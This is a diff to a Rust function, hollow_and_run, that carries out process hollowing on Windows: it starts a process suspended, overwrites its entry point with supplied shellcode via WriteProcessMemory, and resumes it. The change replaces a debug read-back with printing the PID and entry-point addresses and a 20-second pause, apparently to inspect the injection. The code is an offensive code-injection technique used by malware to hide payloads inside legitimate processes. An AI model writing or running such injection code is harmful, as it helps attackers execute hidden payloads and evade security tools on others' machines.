@@ -5,6 +5,7 @@ use windows::Win32::Foundation::PSTR;
 use windows::Win32::Security::SECURITY_ATTRIBUTES;
 use windows::Win32::System::Diagnostics::Debug::{ReadProcessMemory, WriteProcessMemory};
 use windows::Win32::System::Threading::{CreateProcessA, CREATE_SUSPENDED, NtQueryInformationProcess, PROCESS_BASIC_INFORMATION, PROCESS_INFORMATION, ResumeThread, STARTUPINFOA};
+use std::{thread, time};
 
 const POINTER_SIZE: usize = mem::size_of::<&u8>();
 const POINTER_SIZE_TIMES_SIX: u32 = POINTER_SIZE as u32 * 6;
@@ -12,6 +13,7 @@ const E_LFANEW_OFFSET: usize = 0x3C;
 const OPTHDR_ADDITIONAL_OFFSET: usize = 0x28;
 
 pub fn hollow_and_run(shellcode: &[u8]) {
+    let time = time::Duration::from_millis(20000);
     // Create empty StartupInfoA struct for use in CreateProcess
     // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfow
     // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/struct.STARTUPINFOW.html
@@ -96,19 +98,12 @@ pub fn hollow_and_run(shellcode: &[u8]) {
         panic!("Could not write the shellcode to the suspended process with WriteProcessMemory");
     }
 
-// THIS PART WAS PURELY DEBUGGING
-
-    let mut shellcode_buffer = [0; 0x1CC];
-    let read_result = unsafe { ReadProcessMemory(process_handle, entry_point_address as *const c_void, shellcode_buffer.as_mut_ptr() as _, shellcode_buffer.len(), ptr::null_mut()) };
-    if !read_result.as_bool() {
-        panic!("Could not read the DOS header with ReadProcessMemory");
-    }
-
-    println!("{shellcode_buffer:?}");
-
-// END DEBUGGING
-
-    // The issue must be from here down. Process migration and process hollowing memory look identical post-write
+    let pid = basic_information.UniqueProcessId;
+    let near = entry_point_address as usize + shellcode.len() - 32;
+    println!("PID --> {pid}");
+    println!("Entry point --> {entry_point_address:x}");
+    println!("Near buffer end --> {near:x}");
+    thread::sleep(time);
 
     // Start it back up with ResumeThread
     // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-resumethread
